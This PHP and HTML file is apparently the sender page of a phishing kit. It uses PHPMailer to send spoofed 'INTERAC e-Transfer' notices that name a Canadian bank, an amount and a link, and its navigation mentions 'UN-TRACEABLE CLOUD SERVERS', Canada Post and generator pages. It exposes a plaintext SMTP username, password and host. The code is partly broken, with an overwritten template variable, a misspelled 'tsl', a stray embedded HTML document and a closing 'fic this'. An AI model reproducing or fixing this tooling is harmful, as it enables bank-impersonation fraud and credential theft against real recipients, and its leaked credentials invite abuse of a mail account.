
<?php 


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");

$template = file_get_contents('transfer.html');
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
$message = str_replace('{{username}}', $_POST['username'], $template);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);


$mail = new PHPMailer(); 
$mail->IsSMTP(); 
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port']; 
$mail->Body = $message; // use $message instead of $template
$mail->SMTPAuth = true; 
$mail->Username = $_POST['username']; 
$mail->Password = $_POST['password']; 
$mail->SetFrom('triplex@gpnet.ca', $_POST['sender_name']); 
$mail->AddAddress($_POST['receiver_email']); 
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
$mail->IsHTML(true); 
$mail->CharSet="utf-8";

if(!$mail->Send()) {  
    echo "Mailer Error: " . $mail->ErrorInfo;
} 

?>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PHP Mailer System</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
<style>
    /* CSS design optimized for iPhones */
    body {
        font-family: Arial, sans-serif;
        font-size: 16px;
        color: #333333;
        background-color: #f2f2f2;
    }
    #container {
        width: 90%;
        max-width: 600px;
        margin: 0 auto;
        background-color: #ffffff;
        padding: 20px;
        border-radius: 5px;
    }
    input[type="text"], textarea {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
        margin-top: 6px;
        margin-bottom: 16px;
        resize: vertical;
    }
    input[type="submit"] {
        background-color: #4CAF50;
        color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .error {
            color: #ff0000;
        }
    </style>
</head>
<body>

<h1 style="text-align: center;">ONLINE TRANS-GENDER </h1>
<form  action="submit.php" method="POST" enctype="multipart/form-data">
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
	  <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
	    <span class="navbar-toggler-icon"></span>
	  </button>
	  UN-TRACEABLE CLOUD SERVERS
	  <div class="navbar-collapse collapse" id="navbarNav" style="">
	    <center><ul class="navbar-nav">
	      <li class="nav-item active">
	        <a class="nav-link" href="./DA.php">DASHBOARD</a>
	      </li>
	      <li class="nav-item">
	        <a class="nav-link" href="./index.php">SARAH-V2</a>
	      </li>
	      <li class="nav-item">
	        <a class="nav-link" href="./can/040147.php">Canada Post</a>
	      </li>
       <li class="nav-item">
	        <a class="nav-link" href="./PR.php">PROFILES</a>
	      </li>
       <li class="nav-item">
	
	        <a class="nav-link" href="./GO.php">META GEN</a>
	      </li><li class="nav-item">
	        <a class="nav-link" href="./GR.php">T-GEN</a>
	      </li>
	    </ul></center>
	  </div>
	  
	</nav>
 <fieldset>
<center>MOD AS NEEDED</center>
<input type="text"   id="search"  name="link" value="INPUT LINK DO NOT PUT / AT END"  required><br> 
<input type="text"   id="search"  name="receiver_email" value="swiftrynx@gmail.com"  required>
<input type="text"   name="receiver_name" value="One-time Contact" required>
<input type="text"   name="sender_name" value="AB201293 LTD." required>
<input type="text"   name="amount" Value="100.00" step="0.01"  required>
<input type="text"   name="expiredate" Value="May 13, 2023" required>
<input value="https://etransfer-content.interac.ca/en/logo_CA000219.png">
<input name="bank" id="bank" value="ATB Financial">
<input name="photo_href" id="photo_href"  value="/public/deposit/atb/928460.php">

<!DOCTYPE html>
<html>
  <head>
    <title>Canadian Banks Online Banking Sign-Up Forms</title>
  </head>
  <body>
    <h1>Canadian Banks Online Banking Sign-Up Forms</h1>
    <ul>


  </select><input type="submit" value="Submit">

<center>DONT EDIT THIS </center>
<input type="text"       name="port"     value="587"              required>
<input type="text"       name="username"   value="triplex@gpnet.ca" required>
<input type="password"   name="password" value="Triplex2020!"     required>
<input type="text"       name="host"     value="mail.gpnet.ca"    required>
</body></html>
fic this
